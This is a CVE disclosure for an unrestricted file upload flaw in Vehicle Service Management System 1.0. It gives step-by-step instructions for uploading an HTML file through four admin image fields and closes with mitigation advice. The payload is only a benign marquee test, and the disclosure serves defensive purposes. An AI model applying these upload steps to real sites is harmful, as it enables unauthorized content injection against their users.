# CVE-2021-46079

### Exploit Title: Vehicle Service Management System - 'Multiple' File upload Leads to Html Injection
### Exploit Author: <a href="https://www.plsanu.com">P.L.Sanu</a>
### CVE: CVE-2021-46079
### CVSS: 7.2 HIGH
### References: 
- https://www.plsanu.com/vehicle-service-management-system-multiple-file-upload-leads-to-html-injection
- https://nvd.nist.gov/vuln/detail/CVE-2021-46079
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46079

### Description:
An Unrestricted File Upload vulnerability exists in Sourcecodester Vehicle Service Management System 1.0. A remote attacker can upload malicious files leading to Html Injection.

### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user

### Payload:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In My Account Section enter all the required details and browse the html file in Avatar.
5. Click on update button.
6. Open the avatar image in new tab.
7. Html Injection is Executed.

### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.

### Payload:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Create New User Page enter all the required details and browse the html file in Avatar.
5. Click on Save button.
6. Open the avatar image in new tab.
7. Html Injection is Executed.

### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Payload:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Payload:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Settings Section enter all the required details and browse the html file in System Logo.
5. Click on update button.
6. Open the System Logo image in new tab.
7. Html Injection is Executed.

### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Payload:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Settings Section enter all the required details and browse the html file in Website Cover.
5. Click on update button.
6. Open the Website Cover image in new tab.
7. Html Injection is Executed.

### Impact:
An attacker can able to upload malicious file in multiple endpoints it leads to Html Injection.

### Mitigation:
It is recommended to implement the following:

- Never accept a filename and its extension directly without having a white-list filter.
- If there is no need to have Unicode characters, it is highly recommended to only accept alpha-numeric characters and only one dot as an input for the file name and the extension.
- Limit the file size to a maximum value in order to prevent denial of service attacks.
- Uploaded directory should not have any "execute" permission.
- Don't rely on client-side validation only.
